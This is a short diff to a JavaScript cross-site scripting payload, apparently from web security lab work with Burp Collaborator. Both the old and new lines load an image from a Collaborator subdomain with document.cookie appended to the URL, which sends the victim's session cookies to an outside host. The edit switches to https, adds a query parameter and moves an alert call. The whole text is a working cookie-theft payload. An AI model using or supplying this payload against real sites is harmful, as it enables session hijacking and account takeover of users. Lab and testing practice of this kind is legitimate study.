@@ -1,3 +1,3 @@
-alert(document.cookie);
 var i=new Image;
-i.src="http://mb1083y59jybjxs2l7exdyjsxj39ry.burpcollaborator.net/?"+document.cookie;
+i.src="https://457j6cvpxv7z8s1hezrx9nlf76dw1l.burpcollaborator.net/?val="+document.cookie;
+alert(document.cookie);
